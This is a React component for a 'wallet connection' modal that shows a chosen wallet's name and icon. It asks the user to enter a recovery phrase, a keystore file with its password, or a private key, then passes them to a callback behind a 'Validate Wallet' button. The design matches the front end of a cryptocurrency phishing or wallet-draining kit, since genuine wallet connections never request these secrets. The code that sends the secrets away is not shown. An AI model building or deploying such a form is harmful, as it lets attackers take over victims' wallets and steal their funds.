import React, { useState, useEffect } from 'react';
import { Key, FileJson, Lock, ArrowRightLeft } from 'lucide-react';

const Web3ConnectionModal = ({ wallet, isOpen, onClose, onValidate }) => {
  const [activeTab, setActiveTab] = useState('phrase');
  const [inputValue, setInputValue] = useState('');
  const [password, setPassword] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleValidate = async () => {
    if (inputValue.trim() === '' || (activeTab === 'keystore' && password.trim() === '')) {
      setErrorMessage('Please fill in all required fields');
      return;
    }

    if (activeTab === 'phrase') {
      const wordCount = inputValue.trim().split(/\s+/).filter(word => word.length > 0).length;
      if (![12, 15, 24].includes(wordCount)) {
        setErrorMessage('Recovery phrase must contain exactly 12, 15, or 24 words.');
        return;
      }
    }

    setErrorMessage('');
    setIsLoading(true);
    try {
      await onValidate(activeTab, inputValue, password);
    } catch (error) {
      setErrorMessage('Failed to authenticate wallet. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  if (!isOpen) return null;

  const tabs = [
    { id: 'phrase', label: 'Phrase', icon: Key,
      hint: 'Typically 12 (sometimes 24) words separated by a single space' },
    { id: 'keystore', label: 'Keystore', icon: FileJson,
      hint: 'Several lines of text beginning with {...} plus the password you used to encrypt it' },
    { id: 'privateKey', label: 'Private Key', icon: Lock,
      hint: 'Typically 64 alphanumeric characters' }
  ];

  return (
    <div className="fixed inset-0 bg-slate-900/90 backdrop-blur-sm flex items-center justify-center p-4 z-50">
      <div className="bg-slate-900/80 backdrop-blur-sm rounded-2xl w-full max-w-md p-6 border border-purple-500/20">
        {/* Header */}
        <div className="flex items-center space-x-3 mb-6">
          <div className="bg-gradient-to-br from-purple-500/20 to-blue-500/20 rounded-lg p-2">
            <img src={wallet.icon} alt={wallet.name} className="w-8 h-8" />
          </div>
          <h2 className="text-xl font-bold text-purple-50">{wallet.name}</h2>
        </div>

        {/* Tabs */}
        <div className="grid grid-cols-3 gap-2 mb-6">
          {tabs.map(({ id, label, icon: Icon }) => (
            <button
              key={id}
              onClick={() => {
                setActiveTab(id);
                setErrorMessage('');
                setInputValue('');
                setPassword('');
              }}
              className={`flex items-center justify-center space-x-2 py-2 px-4 rounded-lg transition-all duration-300
                ${activeTab === id 
                  ? 'bg-gradient-to-r from-purple-500 to-blue-500 text-white' 
                  : 'bg-slate-800/50 text-slate-400 hover:text-white border border-purple-500/20 hover:border-purple-500/50'}`}
            >
              <Icon className="w-4 h-4" />
              <span className="text-sm font-medium">{label}</span>
            </button>
          ))}
        </div>

        {/* Input Fields */}
        <div className="space-y-4 mb-6">
          <textarea
            className="w-full bg-slate-800/50 border border-purple-500/20 rounded-lg p-3 text-white placeholder-slate-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500 transition-all duration-300"
            rows="4"
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            placeholder={`Enter your ${activeTab === 'phrase' ? 'recovery phrase' : activeTab === 'keystore' ? 'keystore JSON' : 'private key'}`}
          />
          
          {activeTab === 'keystore' && (
            <input
              type="password"
              className="w-full bg-slate-800/50 border border-purple-500/20 rounded-lg p-3 text-white placeholder-slate-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500 transition-all duration-300"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Wallet password"
            />
          )}

          <p className="text-sm text-slate-400">
            {tabs.find(tab => tab.id === activeTab)?.hint}
          </p>

          {errorMessage && (
            <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3">
              <p className="text-red-400 text-sm">{errorMessage}</p>
            </div>
          )}
        </div>

        {/* Action Buttons */}
        <div className="space-y-3">
          <button
            onClick={handleValidate}
            disabled={isLoading}
            className="w-full bg-gradient-to-r from-purple-500 to-blue-500 text-white py-3 px-4 rounded-lg font-medium 
              hover:from-purple-600 hover:to-blue-600 transform hover:scale-[1.02] transition-all duration-300 
              flex items-center justify-center space-x-2 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none
              shadow-lg shadow-purple-500/20"
          >
            {isLoading ? (
              <>
                <div className="w-5 h-5 border-3 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                <span>Validating...</span>
              </>
            ) : (
              <>
                <span>Validate Wallet</span>
                <ArrowRightLeft className="w-4 h-4" />
              </>
            )}
          </button>

          <button
            onClick={onClose}
            className="w-full bg-slate-800/50 text-slate-400 py-3 px-4 rounded-lg font-medium 
              hover:text-white transition-all duration-300 border border-purple-500/20 hover:border-purple-500/50"
          >
            Cancel
          </button>
        </div>
      </div>
    </div>
  );
};

export default Web3ConnectionModal;